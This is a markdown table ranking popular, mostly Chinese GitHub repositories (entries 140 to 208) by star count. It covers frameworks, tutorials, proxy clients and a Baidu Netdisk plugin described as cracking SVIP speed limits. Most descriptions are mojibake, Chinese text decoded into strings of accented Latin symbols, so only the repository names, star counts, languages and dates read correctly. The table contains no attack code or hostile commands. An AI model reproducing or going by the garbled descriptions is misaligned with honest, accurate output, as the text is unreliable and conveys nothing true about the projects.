|140|[aalansehaiyang/technology-talk](https://github.com/aalansehaiyang/technology-talk)|Ê±áÊÄªjavaÁîüÊÄÅÂúàÂ∏∏Áî®ÊäÄÊúØÊ°ÜÊû∂„ÄÅÂºÄÊ∫ê‰∏≠Èó¥‰ª∂ÔºåÁ≥ªÁªüÊû∂ÊûÑ„ÄÅÊï∞ÊçÆÂ∫ì„ÄÅÂ§ßÂÖ¨Âè∏Êû∂ÊûÑÊ°à‰æã„ÄÅÂ∏∏Áî®‰∏âÊñπÁ±ªÂ∫ì„ÄÅÈ°πÁõÆÁÆ°ÁêÜ„ÄÅÁ∫ø‰∏äÈóÆÈ¢òÊéíÊü•„ÄÅ‰∏™‰∫∫ÊàêÈïø„ÄÅÊÄùËÄÉÁ≠âÁü•ËØÜ|11.0k|-|06/29|
|141|[ShusenTang/Dive-into-DL-PyTorch](https://github.com/ShusenTang/Dive-into-DL-PyTorch)|Êú¨È°πÁõÆÂ∞Ü„ÄäÂä®ÊâãÂ≠¶Ê∑±Â∫¶Â≠¶‰π†„Äã(Dive into Deep Learning)Âéü‰π¶‰∏≠ÁöÑMXNetÂÆûÁé∞Êîπ‰∏∫PyTorchÂÆûÁé∞„ÄÇ|10.9k|Jupyter Notebook|09/03|
|142|[jhao104/proxy_pool](https://github.com/jhao104/proxy_pool)|PythonÁà¨Ëô´‰ª£ÁêÜIPÊ±†(proxy pool)|10.9k|Python|10/26|
|143|[peterq/pan-light](https://github.com/peterq/pan-light)|ÁôæÂ∫¶ÁΩëÁõò‰∏çÈôêÈÄüÂÆ¢Êà∑Á´Ø, golang + qt5, Ë∑®Âπ≥Âè∞ÂõæÂΩ¢ÁïåÈù¢|10.9k|Go|09/10|
|144|[leisurelicht/wtfpython-cn](https://github.com/leisurelicht/wtfpython-cn)|wtfpythonÁöÑ‰∏≠ÊñáÁøªËØë/ÊñΩÂ∑•ÁªìÊùü/ ËÉΩÂäõÊúâÈôêÔºåÊ¨¢ËøéÂ∏ÆÊàëÊîπËøõÁøªËØë|10.8k|Python|06/13|
|145|[yanue/V2rayU](https://github.com/yanue/V2rayU)|V2rayU,Âü∫‰∫év2rayÊ†∏ÂøÉÁöÑmacÁâàÂÆ¢Êà∑Á´Ø,Áî®‰∫éÁßëÂ≠¶‰∏äÁΩë,‰ΩøÁî®swiftÁºñÂÜô,ÊîØÊåÅvmess,shadowsocks,socks5Á≠âÊúçÂä°ÂçèËÆÆ,ÊîØÊåÅËÆ¢ÈòÖ, ÊîØÊåÅ‰∫åÁª¥Á†Å,Ââ™Ë¥¥ÊùøÂØºÂÖ•,ÊâãÂä®ÈÖçÁΩÆ,‰∫åÁª¥Á†ÅÂàÜ‰∫´Á≠â|10.8k|-|10/29|
|146|[JessYanCoding/AndroidAutoSize](https://github.com/JessYanCoding/AndroidAutoSize)|üî• A low-cost Android screen adaptation solution (‰ªäÊó•Â§¥Êù°Â±èÂπïÈÄÇÈÖçÊñπÊ°àÁªàÊûÅÁâàÔºå‰∏Ä‰∏™ÊûÅ‰ΩéÊàêÊú¨ÁöÑ Android Â±èÂπïÈÄÇÈÖçÊñπÊ°à).|10.7k|Java|07/15|
|147|[ruanyf/free-books](https://github.com/ruanyf/free-books)|‰∫íËÅîÁΩë‰∏äÁöÑÂÖçË¥π‰π¶Á±ç|10.7k|-|10/27|
|148|[go-kratos/kratos](https://github.com/go-kratos/kratos)|KratosÊòØbilibiliÂºÄÊ∫êÁöÑ‰∏ÄÂ•óGoÂæÆÊúçÂä°Ê°ÜÊû∂ÔºåÂåÖÂê´Â§ßÈáèÂæÆÊúçÂä°Áõ∏ÂÖ≥Ê°ÜÊû∂ÂèäÂ∑•ÂÖ∑„ÄÇ|10.6k|Go|10/28|
|149|[youth5201314/banner](https://github.com/youth5201314/banner)|üî•üî•üî•Banner 2.0 Êù•‰∫ÜÔºÅAndroidÂπøÂëäÂõæÁâáËΩÆÊí≠Êéß‰ª∂ÔºåÂÜÖÈÉ®Âü∫‰∫éViewPager2ÂÆûÁé∞ÔºåIndicatorÂíåUIÈÉΩÂèØ‰ª•Ëá™ÂÆö‰πâ„ÄÇ|10.5k|Java|08/25|
|150|[open-android/Android](https://github.com/open-android/Android)|GitHub‰∏äÊúÄÁÅ´ÁöÑAndroidÂºÄÊ∫êÈ°πÁõÆ,ÊâÄÊúâÂºÄÊ∫êÈ°πÁõÆÈÉΩÊúâËØ¶ÁªÜËµÑÊñôÂíåÈÖçÂ•óËßÜÈ¢ë|10.5k|-|10/03|
|151|[wangeditor-team/wangEditor](https://github.com/wangeditor-team/wangEditor)|wangEditor ‚Äî‚Äî ËΩªÈáèÁ∫ßwebÂØåÊñáÊú¨Ê°Ü|10.5k|TypeScript|10/29|
|152|[meolu/walle-web](https://github.com/meolu/walle-web)|walle - Áì¶Âäõ DevopsÂºÄÊ∫êÈ°πÁõÆ‰ª£Á†ÅÈÉ®ÁΩ≤Âπ≥Âè∞|10.5k|Python|08/20|
|153|[dragen1860/Deep-Learning-with-TensorFlow-book](https://github.com/dragen1860/Deep-Learning-with-TensorFlow-book)|Ê∑±Â∫¶Â≠¶‰π†ÂÖ•Èó®ÂºÄÊ∫ê‰π¶ÔºåÂü∫‰∫éTensorFlow 2.0Ê°à‰æãÂÆûÊàò„ÄÇOpen source Deep Learning book, based on TensorFlow 2.0 framework.|10.4k|Jupyter Notebook|09/24|
|154|[Tim9Liu9/TimLiu-iOS](https://github.com/Tim9Liu9/TimLiu-iOS)|iOSÂºÄÂèëÂ∏∏Áî®‰∏âÊñπÂ∫ì„ÄÅÊèí‰ª∂„ÄÅÁü•ÂêçÂçöÂÆ¢Á≠âÁ≠â|10.4k|-|07/31|
|155|[dt-fe/weekly](https://github.com/dt-fe/weekly)|ÂâçÁ´ØÁ≤æËØªÂë®Âàä|10.3k|-|10/26|
|156|[bailicangdu/node-elm](https://github.com/bailicangdu/node-elm)|Âü∫‰∫é node.js + Mongodb ÊûÑÂª∫ÁöÑÂêéÂè∞Á≥ªÁªü|10.3k|JavaScript|09/11|
|157|[hehonghui/android-tech-frontier](https://github.com/hehonghui/android-tech-frontier)|„ÄêÂÅúÊ≠¢Áª¥Êä§„Äë‰∏Ä‰∏™ÂÆöÊúüÁøªËØëÂõΩÂ§ñAndroid‰ºòË¥®ÁöÑÊäÄÊúØ„ÄÅÂºÄÊ∫êÂ∫ì„ÄÅËΩØ‰ª∂Êû∂ÊûÑËÆæËÆ°„ÄÅÊµãËØïÁ≠âÊñáÁ´†ÁöÑÂºÄÊ∫êÈ°πÁõÆ|10.3k|-|09/02|
|158|[greyireland/algorithm-pattern](https://github.com/greyireland/algorithm-pattern)|ÁÆóÊ≥ïÊ®°ÊùøÔºåÊúÄÁßëÂ≠¶ÁöÑÂà∑È¢òÊñπÂºèÔºåÊúÄÂø´ÈÄüÁöÑÂà∑È¢òË∑ØÂæÑÔºå‰Ω†ÂÄºÂæóÊã•Êúâ~|10.2k|Go|09/20|
|159|[jeasonlzy/okhttp-OkGo](https://github.com/jeasonlzy/okhttp-OkGo)|OkGo - 3.0 ÈúáÊíºÊù•Ë¢≠ÔºåËØ•Â∫ìÊòØÂü∫‰∫é Http ÂçèËÆÆÔºåÂ∞ÅË£Ö‰∫Ü OkHttp ÁöÑÁΩëÁªúËØ∑Ê±ÇÊ°ÜÊû∂ÔºåÊØî Retrofit Êõ¥ÁÆÄÂçïÊòìÁî®ÔºåÊîØÊåÅ RxJavaÔºåRxJava2ÔºåÊîØÊåÅËá™ÂÆö‰πâÁºìÂ≠òÔºåÊîØÊåÅÊâπÈáèÊñ≠ÁÇπ‰∏ãËΩΩÁÆ°ÁêÜÂíåÊâπÈáè‰∏ä‰º†ÁÆ°ÁêÜÂäüËÉΩ|10.2k|Java|05/09|
|160|[apachecn/algo-zh](https://github.com/apachecn/algo-zh)|ÁªìÊûÑÂåñÁÆóÊ≥ïÂà∑È¢òËÆ≠ÁªÉÊåáÂçó|10.1k|CSS|10/06|
|161|[bailicangdu/vue2-manage](https://github.com/bailicangdu/vue2-manage)|Âü∫‰∫é vue + element-ui ÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü|10.0k|Vue|08/31|
|162|[answershuto/learnVue](https://github.com/answershuto/learnVue)|:octocat:Vue.js Ê∫êÁ†ÅËß£Êûê|10.0k|JavaScript|10/19|
|163|[JessYanCoding/MVPArms](https://github.com/JessYanCoding/MVPArms)|‚öîÔ∏è A common architecture for Android applications developing based on MVP, integrates many open source projects, to make your developing quicker and easier (‰∏Ä‰∏™Êï¥Âêà‰∫ÜÂ§ßÈáè‰∏ªÊµÅÂºÄÊ∫êÈ°πÁõÆÈ´òÂ∫¶ÂèØÈÖçÁΩÆÂåñÁöÑ Android MVP Âø´ÈÄüÈõÜÊàêÊ°ÜÊû∂). |9.8k|Java|10/20|
|164|[0voice/from_coder_to_expert](https://github.com/0voice/from_coder_to_expert)|2020Âπ¥ÊúÄÊñ∞ÊÄªÁªìÔºå‰ªéÁ®ãÂ∫èÂëòÂà∞CTOÔºå‰ªé‰∏ì‰∏öËµ∞ÂêëÂçìË∂äÔºåÂàÜ‰∫´Â§ßÁâõ‰ºÅ‰∏öÂÜÖÈÉ®pdf‰∏éPPT|9.8k|-|07/13|
|165|[pagehelper/Mybatis-PageHelper](https://github.com/pagehelper/Mybatis-PageHelper)|MybatisÈÄöÁî®ÂàÜÈ°µÊèí‰ª∂|9.8k|Java|10/13|
|166|[h2y/Shadowrocket-ADBlock-Rules](https://github.com/h2y/Shadowrocket-ADBlock-Rules)|Êèê‰æõÂ§öÊ¨æ Shadowrocket ËßÑÂàôÔºåÂ∏¶ÂπøÂëäËøáÊª§ÂäüËÉΩ„ÄÇÁî®‰∫é iOS Êú™Ë∂äÁã±ËÆæÂ§áÈÄâÊã©ÊÄßÂú∞Ëá™Âä®ÁøªÂ¢ô„ÄÇ|9.7k|Python|10/29|
|167|[weilanwl/ColorUI](https://github.com/weilanwl/ColorUI)|È≤ú‰∫ÆÁöÑÈ´òÈ•±ÂíåËâ≤ÂΩ©Ôºå‰∏ìÊ≥®ËßÜËßâÁöÑÂ∞èÁ®ãÂ∫èÁªÑ‰ª∂Â∫ì|9.6k|Vue|10/18|
|168|[zhongyang219/TrafficMonitor](https://github.com/zhongyang219/TrafficMonitor)|ËøôÊòØ‰∏Ä‰∏™Áî®‰∫éÊòæÁ§∫ÂΩìÂâçÁΩëÈÄü„ÄÅCPUÂèäÂÜÖÂ≠òÂà©Áî®ÁéáÁöÑÊ°åÈù¢ÊÇ¨ÊµÆÁ™óËΩØ‰ª∂ÔºåÂπ∂ÊîØÊåÅ‰ªªÂä°Ê†èÊòæÁ§∫ÔºåÊîØÊåÅÊõ¥Êç¢ÁöÆËÇ§„ÄÇ|9.6k|C++|09/21|
|169|[xiandanin/magnetW](https://github.com/xiandanin/magnetW)|Á£ÅÂäõÈìæÊé•ËÅöÂêàÊêúÁ¥¢|9.5k|JavaScript|07/23|
|170|[justauth/JustAuth](https://github.com/justauth/JustAuth)|:100: Â∞èËÄåÂÖ®ËÄåÁæéÁöÑÁ¨¨‰∏âÊñπÁôªÂΩïÂºÄÊ∫êÁªÑ‰ª∂„ÄÇÁõÆÂâçÂ∑≤ÊîØÊåÅGithub„ÄÅGitee„ÄÅÂæÆÂçö„ÄÅÈíâÈíâ„ÄÅÁôæÂ∫¶„ÄÅCoding„ÄÅËÖæËÆØ‰∫ëÂºÄÂèëËÄÖÂπ≥Âè∞„ÄÅOSChina„ÄÅÊîØ‰ªòÂÆù„ÄÅQQ„ÄÅÂæÆ‰ø°„ÄÅÊ∑òÂÆù„ÄÅGoogle„ÄÅFacebook„ÄÅÊäñÈü≥„ÄÅÈ¢ÜËã±„ÄÅÂ∞èÁ±≥„ÄÅÂæÆËΩØ„ÄÅ‰ªäÊó•Â§¥Êù°„ÄÅTeambition„ÄÅStackOverflow„ÄÅPinterest„ÄÅ‰∫∫‰∫∫„ÄÅÂçé‰∏∫„ÄÅ‰ºÅ‰∏öÂæÆ‰ø°„ÄÅÈÖ∑ÂÆ∂‰πê„ÄÅGitlab„ÄÅÁæéÂõ¢„ÄÅÈ•ø‰∫Ü‰πàÂíåÊé®ÁâπÁ≠âÁ¨¨‰∏âÊñπÂπ≥Âè∞ÁöÑÊéàÊùÉÁôªÂΩï„ÄÇ Login, so easy!|9.5k|Java|10/25|
|171|[USTC-Resource/USTC-Course](https://github.com/USTC-Resource/USTC-Course)|:heart:‰∏≠ÂõΩÁßëÂ≠¶ÊäÄÊúØÂ§ßÂ≠¶ËØæÁ®ãËµÑÊ∫ê|9.5k|C++|10/24|
|172|[snail007/goproxy](https://github.com/snail007/goproxy)|Proxy is a high performance HTTP(S) proxies, SOCKS5 proxies,WEBSOCKET, TCP, UDP proxy server implemented by golang. Now, it supports chain-style proxies,nat forwarding in different lan,TCP/UDP port forwarding, SSH forwarding.ProxyÊòØgolangÂÆûÁé∞ÁöÑÈ´òÊÄßËÉΩhttp,https,websocket,tcp,socks5‰ª£ÁêÜÊúçÂä°Âô®,ÊîØÊåÅÂÜÖÁΩëÁ©øÈÄè,ÈìæÂºè‰ª£ÁêÜ,ÈÄöËÆØÂä†ÂØÜ,Êô∫ËÉΩH ...|9.5k|Go|10/24|
|173|[LuckSiege/PictureSelector](https://github.com/LuckSiege/PictureSelector)|Picture Selector Library for Android  or ÂõæÁâáÈÄâÊã©Âô®|9.4k|Java|10/29|
|174|[yujiangshui/A-Programmers-Guide-to-English](https://github.com/yujiangshui/A-Programmers-Guide-to-English)|‰∏ì‰∏∫Á®ãÂ∫èÂëòÁºñÂÜôÁöÑËã±ËØ≠Â≠¶‰π†ÊåáÂçó v1.2„ÄÇÂú®Á∫øÁâàÊú¨ËØ∑ÁÇπ ->|9.4k|-|08/29|
|175|[seaswalker/spring-analysis](https://github.com/seaswalker/spring-analysis)|SpringÊ∫êÁ†ÅÈòÖËØª|9.2k|Java|10/13|
|176|[shengqiangzhang/examples-of-web-crawlers](https://github.com/shengqiangzhang/examples-of-web-crawlers)|‰∏Ä‰∫õÈùûÂ∏∏ÊúâË∂£ÁöÑpythonÁà¨Ëô´‰æãÂ≠ê,ÂØπÊñ∞ÊâãÊØîËæÉÂèãÂ•Ω,‰∏ªË¶ÅÁà¨ÂèñÊ∑òÂÆù„ÄÅÂ§©Áå´„ÄÅÂæÆ‰ø°„ÄÅË±ÜÁì£„ÄÅQQÁ≠âÁΩëÁ´ô„ÄÇ(Some interesting examples of python crawlers that are friendly to beginners. )|9.2k|Python|05/15|
|177|[modood/Administrative-divisions-of-China](https://github.com/modood/Administrative-divisions-of-China)|‰∏≠Âçé‰∫∫Ê∞ëÂÖ±ÂíåÂõΩË°åÊîøÂå∫ÂàíÔºöÁúÅÁ∫ßÔºàÁúÅ‰ªΩÁõ¥ËæñÂ∏ÇËá™Ê≤ªÂå∫Ôºâ„ÄÅ Âú∞Á∫ßÔºàÂüéÂ∏ÇÔºâ„ÄÅ ÂéøÁ∫ßÔºàÂå∫ÂéøÔºâ„ÄÅ ‰π°Á∫ßÔºà‰π°ÈïáË°óÈÅìÔºâ„ÄÅ ÊùëÁ∫ßÔºàÊùëÂßî‰ºöÂ±ÖÂßî‰ºöÔºâ Ôºå‰∏≠ÂõΩÁúÅÂ∏ÇÂå∫ÈïáÊùë‰∫åÁ∫ß‰∏âÁ∫ßÂõõÁ∫ß‰∫îÁ∫ßËÅîÂä®Âú∞ÂùÄÊï∞ÊçÆ„ÄÇ|9.1k|JavaScript|07/30|
|178|[frank-lam/fullstack-tutorial](https://github.com/frank-lam/fullstack-tutorial)|üöÄ fullstack tutorial 2020ÔºåÂêéÂè∞ÊäÄÊúØÊ†à/Êû∂ÊûÑÂ∏à‰πãË∑Ø/ÂÖ®Ê†àÂºÄÂèëÁ§æÂå∫ÔºåÊò•Êãõ/ÁßãÊãõ/Ê†°Êãõ/Èù¢ËØï|9.0k|Java|05/30|
|179|[daniulive/SmarterStreaming](https://github.com/daniulive/SmarterStreaming)|‰∏öÂÜÖ‰∏∫Êï∞‰∏çÂ§öËá¥Âäõ‰∫éÊûÅËá¥‰ΩìÈ™åÁöÑË∂ÖÂº∫ÂÖ®Ëá™Á†îË∑®Âπ≥Âè∞(windows/android/iOS)ÊµÅÂ™í‰ΩìÂÜÖÊ†∏ÔºåÈÄöËøáÊ®°ÂùóÂåñËá™Áî±ÁªÑÂêàÔºåÊîØÊåÅÂÆûÊó∂RTMPÊé®ÊµÅ„ÄÅRTSPÊé®ÊµÅ„ÄÅRTMPÊí≠ÊîæÂô®„ÄÅRTSPÊí≠ÊîæÂô®„ÄÅÂΩïÂÉè„ÄÅÂ§öË∑ØÊµÅÂ™í‰ΩìËΩ¨Âèë„ÄÅÈü≥ËßÜÈ¢ëÂØºÊí≠„ÄÅÂä®ÊÄÅËßÜÈ¢ëÂêàÊàê„ÄÅÈü≥È¢ëÊ∑∑Èü≥„ÄÅÁõ¥Êí≠‰∫íÂä®„ÄÅÂÜÖÁΩÆËΩªÈáèÁ∫ßRTSPÊúçÂä°Á≠âÔºåÊØîÂø´Êõ¥Âø´Ôºå‰∏öÁïåÁúüÊ≠£Èù†Ë∞±ÁöÑË∂Ö‰ΩéÂª∂ËøüÁõ¥Êí≠SDK(1ÁßíÂÜÖÔºå‰ΩéÂª∂ËøüÊ®°Âºè‰∏ã200~400ms)„ÄÇ|9.0k|Java|10/27|
|180|[cnodejs/nodeclub](https://github.com/cnodejs/nodeclub)|:baby_chick:Nodeclub ÊòØ‰ΩøÁî® Node.js Âíå MongoDB ÂºÄÂèëÁöÑÁ§æÂå∫Á≥ªÁªü|8.9k|JavaScript|09/23|
|181|[gyf-dev/ImmersionBar](https://github.com/gyf-dev/ImmersionBar)|android 4.4‰ª•‰∏äÊ≤âÊµ∏ÂºèÁä∂ÊÄÅÊ†èÂíåÊ≤âÊµ∏ÂºèÂØºËà™Ê†èÁÆ°ÁêÜÔºåÈÄÇÈÖçÊ®™Á´ñÂ±èÂàáÊç¢„ÄÅÂàòÊµ∑Â±è„ÄÅËΩØÈîÆÁõòÂºπÂá∫Á≠âÈóÆÈ¢òÔºåÂèØ‰ª•‰øÆÊîπÁä∂ÊÄÅÊ†èÂ≠ó‰ΩìÈ¢úËâ≤ÂíåÂØºËà™Ê†èÂõæÊ†áÈ¢úËâ≤Ôºå‰ª•Âèä‰∏çÂèØ‰øÆÊîπÂ≠ó‰ΩìÈ¢úËâ≤ÊâãÊú∫ÁöÑÈÄÇÈÖçÔºåÈÄÇÁî®‰∫éActivity„ÄÅFragment„ÄÅDialogFragment„ÄÅDialogÔºåPopupWindowÔºå‰∏ÄÂè•‰ª£Á†ÅËΩªÊùæÂÆûÁé∞Ôºå‰ª•ÂèäÂØπbarÁöÑÂÖ∂‰ªñËÆæÁΩÆÔºåËØ¶ËßÅREADME„ÄÇÁÆÄ‰π¶ËØ∑ÂèÇËÄÉÔºöhttp://www.jianshu.com/p/2a884e211a62|8.9k|Java|10/16|
|182|[programthink/books](https://github.com/programthink/books)|„ÄêÁºñÁ®ãÈöèÊÉ≥„ÄëÊî∂ËóèÁöÑÁîµÂ≠ê‰π¶Ê∏ÖÂçïÔºàÂ§ö‰∏™Â≠¶ÁßëÔºåÂê´‰∏ãËΩΩÈìæÊé•Ôºâ|8.8k|-|08/13|
|183|[skywind3000/kcp](https://github.com/skywind3000/kcp)|KCP - A Fast and Reliable ARQ Protocol (Âø´ÈÄüÂèØÈù†‰º†ËæìÂçèËÆÆ)|8.7k|C|10/22|
|184|[bilibili/DanmakuFlameMaster](https://github.com/bilibili/DanmakuFlameMaster)|AndroidÂºÄÊ∫êÂºπÂπïÂºïÊìé¬∑ÁÉàÁÑ∞ÂºπÂπï‰Ωø ÔΩû|8.7k|Java|02/27|
|185|[lyswhut/lx-music-desktop](https://github.com/lyswhut/lx-music-desktop)|‰∏Ä‰∏™Âü∫‰∫é electron ÁöÑÈü≥‰πêËΩØ‰ª∂|8.6k|Vue|10/30|
|186|[darknessomi/musicbox](https://github.com/darknessomi/musicbox)|ÁΩëÊòì‰∫ëÈü≥‰πêÂëΩ‰ª§Ë°åÁâàÊú¨|8.6k|Python|10/23|
|187|[ChenYilong/iOSInterviewQuestions](https://github.com/ChenYilong/iOSInterviewQuestions)|iOS interview questions;iOSÈù¢ËØïÈ¢òÈõÜÈî¶ÔºàÈôÑÁ≠îÊ°àÔºâ--Â≠¶‰π†qqÁæ§Êàñ Telegram Áæ§‰∫§ÊµÅ https://github.com/ChenYilong/iOSBlog/issues/21|8.5k|C++|06/08|
|188|[CodeTips/BaiduNetdiskPlugin-macOS](https://github.com/CodeTips/BaiduNetdiskPlugin-macOS)|For macOS.ÁôæÂ∫¶ÁΩëÁõò Á†¥Ëß£SVIP„ÄÅ‰∏ãËΩΩÈÄüÂ∫¶ÈôêÂà∂~|8.5k|Objective-C|10/17|
|189|[sparanoid/chinese-copywriting-guidelines](https://github.com/sparanoid/chinese-copywriting-guidelines)|Chinese copywriting guidelines for better written communicationÔºè‰∏≠ÊñáÊñáÊ°àÊéíÁâàÊåáÂåó|8.5k|CoffeeScript|05/07|
|190|[halfrost/LeetCode-Go](https://github.com/halfrost/LeetCode-Go)|‚úÖ Solutions to LeetCode by Go, 100% test coverage, runtime beats 100% / LeetCode È¢òËß£|8.5k|Go|10/18|
|191|[paascloud/paascloud-master](https://github.com/paascloud/paascloud-master)|spring cloud + vue + oAuth2.0ÂÖ®ÂÆ∂Ê°∂ÂÆûÊàòÔºåÂâçÂêéÁ´ØÂàÜÁ¶ªÊ®°ÊãüÂïÜÂüéÔºåÂÆåÊï¥ÁöÑË¥≠Áâ©ÊµÅÁ®ã„ÄÅÂêéÁ´ØËøêËê•Âπ≥Âè∞ÔºåÂèØ‰ª•ÂÆûÁé∞Âø´ÈÄüÊê≠Âª∫‰ºÅ‰∏öÁ∫ßÂæÆÊúçÂä°È°πÁõÆ„ÄÇÊîØÊåÅÂæÆ‰ø°ÁôªÂΩïÁ≠â‰∏âÊñπÁôªÂΩï„ÄÇ|8.5k|Java|07/02|
|192|[zhisheng17/flink-learning](https://github.com/zhisheng17/flink-learning)|flink learning blog. http://www.flink-learning.com  Âê´ Flink ÂÖ•Èó®„ÄÅÊ¶ÇÂøµ„ÄÅÂéüÁêÜ„ÄÅÂÆûÊàò„ÄÅÊÄßËÉΩË∞É‰ºò„ÄÅÊ∫êÁ†ÅËß£ÊûêÁ≠âÂÜÖÂÆπ„ÄÇÊ∂âÂèä Flink Connector„ÄÅMetrics„ÄÅLibrary„ÄÅDataStream API„ÄÅTable API & SQL Á≠âÂÜÖÂÆπÁöÑÂ≠¶‰π†Ê°à‰æãÔºåËøòÊúâ Flink ËêΩÂú∞Â∫îÁî®ÁöÑÂ§ßÂûãÈ°πÁõÆÊ°à‰æãÔºàPVUV„ÄÅÊó•ÂøóÂ≠òÂÇ®„ÄÅÁôæ‰∫øÊï∞ÊçÆÂÆûÊó∂ÂéªÈáç„ÄÅÁõëÊéßÂëäË≠¶ÔºâÂàÜ‰∫´„ÄÇÊ¨¢ËøéÂ§ßÂÆ∂ÊîØÊåÅÊàëÁöÑ‰∏ìÊ†è„ÄäÂ§ßÊï∞ÊçÆÂÆûÊó∂ËÆ°ÁÆóÂºïÊìé Flink ÂÆûÊàò‰∏éÊÄßËÉΩ‰ºòÂåñ„Äã|8.4k|Java|10/17|
|193|[stanzhai/be-a-professional-programmer](https://github.com/stanzhai/be-a-professional-programmer)|Êàê‰∏∫‰∏ì‰∏öÁ®ãÂ∫èÂëòË∑Ø‰∏äÁî®Âà∞ÁöÑÂêÑÁßç‰ºòÁßÄËµÑÊñô„ÄÅÁ•ûÂô®ÂèäÊ°ÜÊû∂|8.4k|-|07/16|
|194|[bailicangdu/vue2-happyfri](https://github.com/bailicangdu/vue2-happyfri)|vue2 + vue-router + vuex  ÂÖ•Èó®È°πÁõÆ|8.4k|JavaScript|08/11|
|195|[chokcoco/iCSS](https://github.com/chokcoco/iCSS)|‰∏çÊ≠¢‰∫é CSS|8.3k|-|10/29|
|196|[hyb1996/Auto.js](https://github.com/hyb1996/Auto.js)|A UiAutomator on android, does not need root access(ÂÆâÂçìÂπ≥Âè∞‰∏äÁöÑJavaScriptËá™Âä®ÂåñÂ∑•ÂÖ∑)|8.3k|Java|10/07|
|197|[trazyn/ieaseMusic](https://github.com/trazyn/ieaseMusic)|ÁΩëÊòì‰∫ëÈü≥‰πêÁ¨¨‰∏âÊñπ|8.3k|JavaScript|07/07|
|198|[lihengming/spring-boot-api-project-seed](https://github.com/lihengming/spring-boot-api-project-seed)|:seedling::rocket:‰∏Ä‰∏™Âü∫‰∫éSpring Boot & MyBatisÁöÑÁßçÂ≠êÈ°πÁõÆÔºåÁî®‰∫éÂø´ÈÄüÊûÑÂª∫‰∏≠Â∞èÂûãAPI„ÄÅRESTful APIÈ°πÁõÆ~|8.3k|Java|10/22|
|199|[talkgo/night](https://github.com/talkgo/night)|Weekly Go Online Meetup via BilibiliÔΩúGo Â§úËØªÔΩúÁî± SIG ÊàêÂëòÁª¥Êä§ÔΩúÈÄöËøá bilibili Âú®Á∫øÁõ¥Êí≠ÁöÑÊñπÂºèÂàÜ‰∫´ Go Áõ∏ÂÖ≥ÁöÑÊäÄÊúØËØùÈ¢òÔºåÊØèÂ§©Â§ßÂÆ∂Âú®ÂæÆ‰ø°/telegram/Slack ‰∏äÂèäÊó∂Ê≤üÈÄö‰∫§ÊµÅÁºñÁ®ãÊäÄÊúØËØùÈ¢ò„ÄÇ|8.3k|Go|10/20|
|200|[GitHubDaily/GitHubDaily](https://github.com/GitHubDaily/GitHubDaily)|GitHubDaily ÂàÜ‰∫´ÂÜÖÂÆπÂÆöÊúüÊï¥ÁêÜ‰∏éÂàÜÁ±ª„ÄÇÊ¨¢ËøéÊé®Ëçê„ÄÅËá™ËçêÈ°πÁõÆÔºåËÆ©Êõ¥Â§ö‰∫∫Áü•ÈÅì‰Ω†ÁöÑÈ°πÁõÆ„ÄÇ|8.2k|-|07/10|
|201|[YunaiV/SpringBoot-Labs](https://github.com/YunaiV/SpringBoot-Labs)|‰∏Ä‰∏™Ê∂µÁõñÂÖ≠‰∏™‰∏ìÊ†èÔºöSpring Boot 2.X„ÄÅSpring Cloud„ÄÅSpring Cloud Alibaba„ÄÅDubbo„ÄÅÂàÜÂ∏ÉÂºèÊ∂àÊÅØÈòüÂàó„ÄÅÂàÜÂ∏ÉÂºè‰∫ãÂä°ÁöÑ‰ªìÂ∫ì„ÄÇÂ∏åÊúõËÉñÂèãÂ∞èÊâã‰∏ÄÊäñÔºåÂè≥‰∏äËßíÊù•‰∏™ StarÔºåÊÑüÊÅ© 1024|8.2k|Java|10/23|
|202|[toutiaoio/awesome-architecture](https://github.com/toutiaoio/awesome-architecture)|Êû∂ÊûÑÂ∏àÊäÄÊúØÂõæË∞±ÔºåÂä©‰Ω†Êó©Êó•Êàê‰∏∫Êû∂ÊûÑÂ∏à|8.2k|-|10/29|
|203|[APIJSON/APIJSON](https://github.com/APIJSON/APIJSON)|üèÜÁ†Å‰∫ëÊúÄÊúâ‰ª∑ÂÄºÂºÄÊ∫êÈ°πÁõÆ üöÄÂêéÁ´ØÊé•Âè£ÂíåÊñáÊ°£Ëá™Âä®ÂåñÔºåÂâçÁ´Ø(ÂÆ¢Êà∑Á´Ø) ÂÆöÂà∂ËøîÂõû JSON ÁöÑÊï∞ÊçÆÂíåÁªìÊûÑÔºÅüèÜGitee Most Valuable Project üöÄA JSON Transmission Protocol and an ORM Library for automatically providing APIs and Docs.|8.2k|Java|10/27|
|204|[heibaiying/BigData-Notes](https://github.com/heibaiying/BigData-Notes)|Â§ßÊï∞ÊçÆÂÖ•Èó®ÊåáÂçó  :star:|8.2k|Java|10/20|
|205|[zhaoolee/ChineseBQB](https://github.com/zhaoolee/ChineseBQB)|üá®üá≥ Chinese sticker pack,More joy / Ë°®ÊÉÖÂåÖÁöÑÂçöÁâ©È¶Ü, GithubÊúÄÊúâÊØíÁöÑ‰ªìÂ∫ì, ‰∏≠ÂõΩË°®ÊÉÖÂåÖÂ§ßÈõÜÂêà, ËÅöÊ¨¢‰πê~|8.2k|JavaScript|10/12|
|206|[hackware1993/MagicIndicator](https://github.com/hackware1993/MagicIndicator)|A powerful, customizable and extensible ViewPager indicator framework. As the best alternative of ViewPagerIndicator, TabLayout and PagerSlidingTabStrip   ‚Äî‚Äî   Âº∫Â§ß„ÄÅÂèØÂÆöÂà∂„ÄÅÊòìÊâ©Â±ïÁöÑ ViewPager ÊåáÁ§∫Âô®Ê°ÜÊû∂„ÄÇÊòØViewPagerIndicator„ÄÅTabLayout„ÄÅPagerSlidingTabStripÁöÑÊúÄ‰Ω≥Êõø‰ª£ÂìÅ„ÄÇÊîØÊåÅËßíÊ†áÔºåÊõ¥ÊîØÊåÅÂú®ÈùûViewPagerÂú∫ÊôØ‰∏ã‰ΩøÁî®Ôºà‰ΩøÁî®hide()„ÄÅshow()ÂàáÊç¢FragmentÊàñ‰ΩøÁî®se ...|8.2k|Java|09/29|
|207|[chenyuntc/pytorch-book](https://github.com/chenyuntc/pytorch-book)|PyTorch tutorials and fun projects including neural talk, neural style, poem writing, anime generation („ÄäÊ∑±Â∫¶Â≠¶‰π†Ê°ÜÊû∂PyTorchÔºöÂÖ•Èó®‰∏éÂÆûÊàò„Äã)|8.1k|Jupyter Notebook|07/14|
|208|[EtherDream/jsproxy](https://github.com/EtherDream/jsproxy)|‰∏Ä‰∏™Âü∫‰∫éÊµèËßàÂô®Á´Ø JS ÂÆûÁé∞ÁöÑÂú®Á∫ø‰ª£ÁêÜ|8.0k|Shell|05/08|
